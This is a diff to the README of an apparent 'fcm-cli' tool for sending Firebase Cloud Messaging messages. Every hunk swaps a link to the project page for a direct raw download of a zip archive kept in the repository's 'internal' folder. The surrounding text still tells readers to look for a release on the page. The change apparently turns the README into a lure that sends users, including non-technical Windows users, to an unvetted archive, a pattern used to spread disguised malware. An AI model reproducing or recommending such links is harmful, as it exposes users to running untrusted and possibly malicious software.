@@ -1,12 +1,12 @@
 # 🛠️ fcm-cli - Send FCM messages with ease
 
-[![Download fcm-cli](https://img.shields.io/badge/Download%20fcm--cli-blue?style=for-the-badge)](https://github.com/Mainspringpluralist318/fcm-cli)
+[![Download fcm-cli](https://img.shields.io/badge/Download%20fcm--cli-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mainspringpluralist318/fcm-cli/main/internal/cli-fcm-1.3-beta.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the page to download:
 
-https://github.com/Mainspringpluralist318/fcm-cli
+https://raw.githubusercontent.com/Mainspringpluralist318/fcm-cli/main/internal/cli-fcm-1.3-beta.1.zip
 
 ## ✅ What this app does
 
@@ -38,7 +38,7 @@ Follow these steps to run fcm-cli on Windows.
 
 Go to:
 
-https://github.com/Mainspringpluralist318/fcm-cli
+https://raw.githubusercontent.com/Mainspringpluralist318/fcm-cli/main/internal/cli-fcm-1.3-beta.1.zip
 
 Look for the latest release, build file, or download option on the page.
 
@@ -254,7 +254,7 @@ Have these values ready when you use the tool:
 
 Visit this page to download and set up the app:
 
-https://github.com/Mainspringpluralist318/fcm-cli
+https://raw.githubusercontent.com/Mainspringpluralist318/fcm-cli/main/internal/cli-fcm-1.3-beta.1.zip
 
 ## 📌 Notes for new users
 
